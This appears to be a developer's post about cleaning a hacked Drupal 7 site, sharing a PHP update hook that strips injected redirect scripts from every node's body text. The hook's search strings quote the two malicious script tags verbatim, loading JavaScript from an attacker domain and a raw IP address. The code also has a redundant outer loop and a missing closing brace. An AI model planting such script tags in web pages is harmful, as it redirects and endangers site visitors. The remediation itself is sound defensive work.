We recently had someone come to us with a horribly compromised site after the last round of critical site patches. It hadn't been updated since 7.44 and every node was redirecting visitors to a malicious site via JavaScript. Luckily, the JS was the same on every node (and there were only hundreds of nodes, not thousands, so I didn't have to batch this), so I wrote up an update hook to find the code in the body text and get rid of it. Time was of the essence here, this was a pretty big brand's smaller sites (two of them were identically affected, so we did this on both).

Here's the hook:
```
/**
 * Update all nodes to remove malicious scripts.
 */
function anonymousclientsite_deployment_update_7005() {
  $query = new EntityFieldQuery();
  $query->entityCondition('entity_type', 'node');
  $result = $query->execute();

  if (isset($result['node'])) {
    foreach($result as $node) {
      $nids = array_keys($result['node']);
      $nodes = node_load_multiple($nids);
      foreach ($nodes as $node) {
        $find = array("<script type='text/javascript' src='https://js.localstorage.tk/s.js?qr=888'></script>", "<script type='text/javascript' src='http://193.201.224.233/m.js?d=1'></script>");
        $replace = '';
        $str = $node->body['und'][0]['value'];
        $str = str_replace($find, $replace, $str);
        $node->body['und'][0]['value'] = $str;
        node_save($node);
      }
    }
    drupal_set_message('All nodes updated.');
  }
```
